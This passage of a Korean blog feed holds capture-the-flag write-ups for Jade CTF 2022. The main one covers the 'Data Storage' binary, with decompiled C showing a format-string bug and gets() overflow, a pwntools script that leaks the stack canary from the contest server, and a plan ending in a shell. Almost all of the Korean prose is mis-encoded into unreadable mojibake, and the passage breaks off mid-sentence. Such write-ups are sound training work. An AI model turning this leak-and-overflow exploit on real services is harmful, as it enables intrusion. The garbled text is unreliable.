ì‚´íŽ´ë³´ìž.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ registers â”€â”€â”€â”€</span><br><span class="line"></span><br><span class="line">$rsp   : 0x007ffd7b94f028  â†’  0x0000000000000008</span><br><span class="line">$rip   : 0x007ffd7b94f029  â†’  0x0000000000000000</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ stack â”€â”€â”€â”€</span><br><span class="line">   0x7ffd7b94f024                  xor    esi, esi</span><br><span class="line">   0x7ffd7b94f026                  push   rsi</span><br><span class="line">   0x7ffd7b94f027                  push   0x8</span><br><span class="line"> â†’ 0x7ffd7b94f029                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02b                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02d                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f02f                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f031                  add    BYTE PTR [rax], al</span><br><span class="line">   0x7ffd7b94f033                  add    BYTE PTR [rax], al</span><br></pre></td></tr></table></figure><p>.. ì‰˜ì½”ë“œë¥¼ ì‹¤í–‰í•˜ë‹¤ê°€ ë©ˆì·„ë‹¤. ì‰˜ì½”ë“œê°€ ì €ìž¥ëœ ê³³ì— ê°’ì„ ì“°ê³  ìžˆì–´ì„œ í•œë§ˆë””ë¡œ ì‹¤í–‰í•  ì½”ë“œê°€ ì €ìž¥ëœ ê³³ì´ ìŠ¤íƒì¸ë° ê·¸ ìŠ¤íƒì— ì´ê²ƒì €ê²ƒ ì“°ë©´ì„œ ì‚¬ìš©í•˜ê³  ìžˆê¸° ë•Œë¬¸ì— ì‹¤í–‰í•  ì½”ë“œê°€ ë”ëŸ½í˜€ì¡Œë‹¤.</p><p>ê·¸ëž˜ì„œ <code>sub rsp, 0x1000</code>ì„ ì¶”ê°€í•´ì„œ ì‚¬ìš©í•˜ëŠ” ìŠ¤íƒì´ëž‘ ì‰˜ì½”ë“œê°€ ì €ìž¥ë˜ëŠ” ìŠ¤íƒì´ëž‘ ë‹¤ë¥´ê²Œ ìœ„ì¹˜ì‹œì¼œì£¼ì—ˆë‹¤.</p><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;d1d_y0u_l1k3_th3_du4l_pwn?&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ëŒ€íšŒ ëë‚˜ê³  í’€ì—ˆë‹¤. ì´ ë°”ì´ë„ˆë¦¬ì—ì„œ ì·¨ì•½ì ì€ ë¹„êµì  ì°¾ê¸° ì‰½ì§€ë§Œ.. flagë¥¼ ì–»ê¸° ìœ„í•œ ê³¼ì •ì´ ìˆœíƒ„ì¹˜ ì•Šì•˜ë‹¤â€¦â€¦â€¦.. ìƒˆë¡­ê²Œ ì•Œê²Œëœ ê²ƒì´ ìžˆë‹¤. base64ë¥¼ ì´ìš©í•´ì„œ ë¦¬ëª¨íŠ¸ íŒŒì¼ì„ ë³µì‚¬í•´ì˜¨ë‹¤ëŠ” ì •ë„? </p><p>ê·¸ë¦¬ê³  ì›ëž˜ ì•Œê³  ìžˆì—ˆì§€ë§Œ ë¬¸ì œ í’€ ë•Œ ë¦¬ë§ˆì¸ë“œ ëœ ê²ƒë“¤.<br>ì˜ˆë¥¼ ë“¤ë©´ return addressë¥¼ ê±´ë“¤ê¸° ìœ„í•´ì„œëŠ” í•¨ìˆ˜ returnì„ í•´ì¤˜ì•¼ í•œë‹¤ê±°ë‚˜, NX bitê°€ í•´ì œë˜ì–´ ìžˆìœ¼ë©´ ìŠ¤íƒì—ì„œ Shellcodeë¥¼ ì‹¤í–‰ì‹œí‚¬ ìˆ˜ ìžˆê³ , ì´ë•Œ ìµìŠ¤ í™•ë¥ ì„ ë†’ì´ê¸° ìœ„í•´ì„œ NOP Sledë¥¼ í•  ìˆ˜ ìžˆë‹¤ëŠ” ê²ƒ ì •ë„?</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shellcode </tag>
            
            <tag> NOP Sled </tag>
            
            <tag> base64 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jade CTF 2022 - Data Storage (canary, pie)</title>
      <link href="/221026-jadectf2022-data_storage/"/>
      <url>/221026-jadectf2022-data_storage/</url>
      
        <content type="html"><![CDATA[<h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(32&#x2F;630) solves</p><h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>In his DBMS course, Shekhar was learning about CRUD operations. He was taught these operations in SQL, but he wanted to try them out in C. He wrote a program for reading data from input, and then scrambling it so other users canâ€™t figure out what is stored. He gave me the binary to test it, could you help me out?</p><p>nc 34.76.206.46 10003</p><h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">â””â”€â”€ chall</span><br></pre></td></tr></table></figure><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ì¹´ë‚˜ë¦¬ê°€ ìžˆê³  PIEë„ ìžˆë‹¤.. </p><h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p>ì½”ë“œëŠ” ê°„ë‹¨í•˜ë‹¤. main()ì—ì„œ database_store()ë¥¼ í˜¸ì¶œí•˜ëŠ”ë° ì´ í•¨ìˆ˜ì— ì·¨ì•½í•œ ë¶€ë¶„ì´ ì¡´ìž¬í•œë‹¤. ê·¸ëž˜ì„œ ì´ í•¨ìˆ˜ í•˜ë‚˜ë§Œ ë³´ë©´ ëœë‹¤.</p><h3 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">database_store</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [rsp+4h] [rbp-23Ch]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> yes[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-220h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">520</span>]; <span class="comment">// [rsp+30h] [rbp-210h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v17; <span class="comment">// [rsp+238h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v17 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Are you sure that you want to store data [yes/no]?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  s[<span class="built_in">strcspn</span>(s, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You entered: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);                                    <span class="comment">// fsb</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nIs that correct?&quot;</span>);</span><br><span class="line">  fgets(yes, <span class="number">10</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  yes[<span class="built_in">strcspn</span>(yes, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(yes, <span class="string">&quot;yes&quot;</span>) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now, it&#x27;s time to enter your details&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Note that there is a length given for each field, you have to enter atleast that many characters&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Fill it up with spaces if your input is less&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">    <span class="string">&quot;Enter your Name(%d), Admission Number(%d), Branch(%d), University(%d), and Address(%d) (in this order):\n&quot;</span>,</span><br><span class="line">    n,</span><br><span class="line">    an,</span><br><span class="line">    b,</span><br><span class="line">    u,</span><br><span class="line">    a[<span class="number">0</span>]);</span><br><span class="line">  gets(input);                                  <span class="comment">// bof</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Scrambling your data so that hackers can&#x27;t steal it...&quot;</span>);</span><br><span class="line">  modify(&amp;name, input, <span class="number">0LL</span>, n);</span><br><span class="line">  v1 = n;</span><br><span class="line">  modify(&amp;admno, input, n, an);</span><br><span class="line">  v2 = an + v1;</span><br><span class="line">  modify(&amp;branch, input, v2, b);</span><br><span class="line">  v3 = b + v2;</span><br><span class="line">  modify(&amp;university, input, v3, u);</span><br><span class="line">  modify(&amp;address, input, u + v3, a[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">memset</span>(input, <span class="number">0</span>, <span class="number">0x200</span>uLL);</span><br><span class="line">  modify(input, &amp;name, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>));</span><br><span class="line">  v4 = (<span class="type">int</span>)n / <span class="number">2</span>;</span><br><span class="line">  modify(&amp;input[(<span class="type">int</span>)n / <span class="number">2</span>], &amp;branch, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>));</span><br><span class="line">  v5 = (<span class="type">int</span>)b / <span class="number">3</span> + v4;</span><br><span class="line">  modify(&amp;input[v5], &amp;admno, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>));</span><br><span class="line">  v6 = (<span class="type">int</span>)an / <span class="number">3</span> + v5;</span><br><span class="line">  modify(&amp;input[v6], &amp;university, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>));</span><br><span class="line">  v7 = (<span class="type">int</span>)u / <span class="number">2</span> + v6;</span><br><span class="line">  modify(&amp;input[v7], &amp;address, <span class="number">0LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v8 = a[<span class="number">0</span>] / <span class="number">10</span> + v7;</span><br><span class="line">  modify(&amp;input[v8], &amp;branch, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)b / <span class="number">3</span>), b - (<span class="type">int</span>)b / <span class="number">3</span>);</span><br><span class="line">  v9 = b - (<span class="type">int</span>)b / <span class="number">3</span> + v8;</span><br><span class="line">  modify(&amp;input[v9], &amp;name, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)n / <span class="number">2</span>), n - (<span class="type">int</span>)n / <span class="number">2</span>);</span><br><span class="line">  v10 = n - (<span class="type">int</span>)n / <span class="number">2</span> + v9;</span><br><span class="line">  modify(&amp;input[v10], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] / <span class="number">10</span>));</span><br><span class="line">  v11 = a[<span class="number">0</span>] / <span class="number">10</span> + v10;</span><br><span class="line">  modify(&amp;input[v11], &amp;university, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span>), (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  v12 = (<span class="type">int</span>)u / <span class="number">4</span> + v11;</span><br><span class="line">  modify(&amp;input[v12], &amp;admno, (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)an / <span class="number">3</span>), an - (<span class="type">int</span>)an / <span class="number">3</span>);</span><br><span class="line">  v13 = an - (<span class="type">int</span>)an / <span class="number">3</span> + v12;</span><br><span class="line">  modify(&amp;input[v13], &amp;address, (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)), (<span class="type">unsigned</span> <span class="type">int</span>)(a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>)));</span><br><span class="line">  modify(</span><br><span class="line">    &amp;input[a[<span class="number">0</span>] - <span class="number">2</span> * (a[<span class="number">0</span>] / <span class="number">10</span>) + v13],</span><br><span class="line">    &amp;university,</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">int</span>)((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>),</span><br><span class="line">    u - ((<span class="type">int</span>)u / <span class="number">2</span> + (<span class="type">int</span>)u / <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v17;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì½”ë“œê°€ ë³µìž¡í•´ë³´ì´ì§€ë§Œ(?) ê¸°ëŠ¥ ë¶„ì„ì„ í•  í•„ìš”ëŠ” ì—†ë‹¤. ì·¨ì•½ì ì„ ì°¾ëŠ” ê²ƒì´ ëª©í‘œì´ê¸° ë•Œë¬¸ì— í•„ìš”í•œ ë¶€ë¶„ë§Œ ì½ìœ¼ë©´ ëœë‹¤.</p><p>ê·¸ëŸ¬ë©´ fsbì™€ bofê°€ ëŒ€ë†“ê³  ë³´ì´ëŠ” ê²ƒì„ ì°¾ì„ ìˆ˜ ìžˆë‹¤.</p><p>fsbë¡œ í•„ìš”í•œ ê²ƒì„ leakí•˜ê³  bofë¥¼ ì´ìš©í•´ì„œ ROPë¥¼ í•˜ë©´ ëœë‹¤. ë§ì€ ì´ë ‡ê²Œ ê°„ë‹¨í•˜ì§€ë§Œ ìµìŠ¤í•˜ëŠ”ë° ê½¤ë‚˜ ì˜¤ëž˜ê±¸ë ¸ê³  ìƒê°ë³´ë‹¤ ìŠ¤íŠ¸ë ˆìŠ¤ë¥¼ ë°›ì•˜ì—ˆë‹¤.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>local ê¸°ì¤€ìœ¼ë¡œ ìµìŠ¤ë¥¼ ìž‘ì„±í–ˆëŠ”ë° remoteëŠ” ìž˜ ë˜ì§€ ì•ŠëŠ” ë¬¸ì œ(?)ê°€ ë°œìƒí–ˆë‹¤. (ë¡œë˜ë¦¬ì•ˆ ã…œ)</p><p>localê³¼ remoteì˜ libcê°€ ë‹¬ë¼ì„œ ìŠ¤íƒì— ê°’ì´ ìŒ“ì´ëŠ”ê²Œ ë‹¬ë¼ì¡Œë‹¤. ê·¸ëž˜ì„œ leakí•  offsetì„ ë£¨í”„ë¥¼ ëŒë ¤ì„œ ì°¾ëŠ” ê³¼ì •ì´ ì¶”ê°€ì ìœ¼ë¡œ í•„ìš”í•˜ë‹¤.</p><p>ì•„ëž˜ë¶€í„° remote ê¸°ì¤€ìœ¼ë¡œ ì„¤ëª…ì„ í•œë‹¤.</p><h3 id="Exploit-Scenario"><a href="#Exploit-Scenario" class="headerlink" title="Exploit Scenario"></a>Exploit Scenario</h3><ul><li>ì‚¬ì „ ìž‘ì—…: fsbë¥¼ ì´ìš©í•˜ì—¬ canary, pie offset ì°¾ê¸°</li></ul><ol><li>canary leakí•˜ê³  mainìœ¼ë¡œ ëŒë¦¬ê¸°</li><li>pie leakí•˜ê³  mainìœ¼ë¡œ ëŒë¦¬ê¸°</li><li>got ì¶œë ¥í•´ì„œ libc êµ¬í•˜ê¸°</li><li><code>system(&#39;/bin/sh\x00&#39;)</code>ìœ¼ë¡œ íë¦„ ëŒë¦¬ê¸°</li></ol><h3 id="pre-work"><a href="#pre-work" class="headerlink" title="pre-work"></a>pre-work</h3><h4 id="leak-canary-amp-pie"><a href="#leak-canary-amp-pie" class="headerlink" title="leak canary &amp; pie"></a>leak canary &amp; pie</h4><p>canary leakì„ ìœ„í•œ ì½”ë“œëŠ” ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        off = off+<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">print</span>(off-<span class="number">1</span>, <span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#log.info(hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span> <span class="comment"># ret</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)             <span class="comment">######## !!! ########</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>ì œì¼ ë¨¼ì € í•´ì•¼í•  ì¼ì€ canaryë¥¼ leakí•˜ëŠ” ê²ƒì´ë‹¤. offsetì„ ì°¾ê¸° ìœ„í•´ì„œ ë£¨í”„ë¥¼ ëŒ ë•Œ try-exceptì„ ì´ìš©í•´ì„œ ì˜ˆì™¸ì²˜ë¦¬ë¥¼ í•´ì£¼ì—ˆë‹¤. ë§Œì•½ ì˜ˆì™¸ê°€ ë°œìƒí•œë‹¤ë©´ ë‹¤ì‹œ remoteì— ì—°ê²°í•´ì£¼ì—ˆëŠ”ë°, <code>p.close()</code>ë¥¼ ì•ˆí•´ì¤€ë‹¤ë©´ í”„ë¡œì„¸ìŠ¤ê°€ ê³„ì† ì‚´ì•„ìžˆê¸° ë•Œë¬¸ì— remoteì— ìƒˆë¡œ ì—°ê²°í•´ì£¼ê¸° ì „ì— closeë¥¼ í•´ì£¼ì–´ì•¼ í•œë‹¤.</p><p>fsbë¥¼ ì´ìš©í•´ì„œ leakí•˜ê³  ìœ íš¨í•œ ì£¼ì†Œë¥¼ ê°€ì ¸ì˜¤ëŠ” ê³¼ì •ì—ì„œ ì˜ˆì™¸ê°€ ë°œìƒí•  ê°€ëŠ¥ì„±ì´ ì¡´ìž¬í•œë‹¤. ì£¼ì†Œë¥¼ ì¶œë ¥í•  ë•Œ 16ì§„ìˆ˜ ê°’ì´ê±°ë‚˜ <code>(nil)</code>ì„ ì¶œë ¥í•´ì£¼ëŠ”ë° í›„ìžì¼ ê²½ìš° <code>int(leak, 16)</code>ì—ì„œ ì—ëŸ¬ê°€ ë°œìƒí•˜ê¸° ë•Œë¬¸ì— exceptìœ¼ë¡œ ê°€ì„œ ì˜ˆì™¸ì²˜ë¦¬ë¥¼ í•´ì¤„ ìˆ˜ ìžˆë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">invalid literal for int() with base 16: b&#x27;il)\n&#x27;</span><br><span class="line">[*] Closed connection to 34.76.206.46 port 10003</span><br></pre></td></tr></table></figure><p>ë£¨í”„ê°€ ëë‚˜ê³  pauseë¥¼ í•´ì¤¬ê¸° ë•Œë¬¸ì— ë©ˆì¶”ëŠ” ê³³ì„ ë³´ë©´ ë°”ë¡œ canaryë¥¼ ì°¾ì„ ìˆ˜ ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 34.76.206.46 on port 10003: Done</span><br><span class="line">77 0x8a3ffc38e32e9500</span><br><span class="line">[*] Paused (press any to continue)</span><br></pre></td></tr></table></figure><p>offsetì€ 77ìž„ì„ ë°”ë¡œ ì•Œ ìˆ˜ ìžˆë‹¤. </p><p>pauseí•˜ëŠ” ì¡°ê±´ì€ ì£¼ì„ì— <code>!!!</code>í•œ ê³³ì„ ë³´ë©´ ì•Œ ìˆ˜ ìžˆë‹¤. <code>]?\n</code>ì€ ì´ í•¨ìˆ˜ ì´ˆë°˜ì— ì¶œë ¥í•˜ëŠ” ë¬¸ìžì—´ ì¤‘ ì¼ë¶€ì´ë‹¤. retë¥¼ ì´ í•¨ìˆ˜ë¡œ ëŒë ¤ì£¼ì—ˆê¸° ë•Œë¬¸ì— ì´ê²ƒì´ ì¶œë ¥ëœë‹¤ë©´ leakí•œ ê°’ì´ canaryìž„ì„ ë°”ë¡œ í™•ì¸í•  ìˆ˜ ìžˆë‹¤.</p><p>ì‚¬ì‹¤ canaryê°€ êµ¬í•´ì ¸ë„ ë°”ë¡œ retë¡œ ëŒë¦´ ìˆ˜ê°€ ì—†ë‹¤. ì™œëƒí•˜ë©´ pie baseì˜ ê°’ì´ ëžœë¤ì´ê¸° ë•Œë¬¸ì— ì•„ëž˜ì™€ ê°™ì€ baseì´ê¸¸ ê¸°ëŒ€í•´ì•¼í•œë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x561aa9000000</span><br></pre></td></tr></table></figure><p>ë‚´ê°€ ëŒë¦¬ê³  ì‹¶ì€ ì£¼ì†ŒëŠ” <code>pie_base + 0x1578</code>ì¸ë° ë””ë²„ê¹…ì„ í•˜ë‹¤ë³´ë©´ <code>0x01578</code>ì´ ê³ ì •ì¸ ê²ƒì„ ì•Œ ìˆ˜ ìžˆë‹¤. 2.5ë°”ì´íŠ¸ê°€ ê³ ì •ì¸ë° 0.5ë°”ì´íŠ¸ë§Œ ì“¸ ìˆ˜ 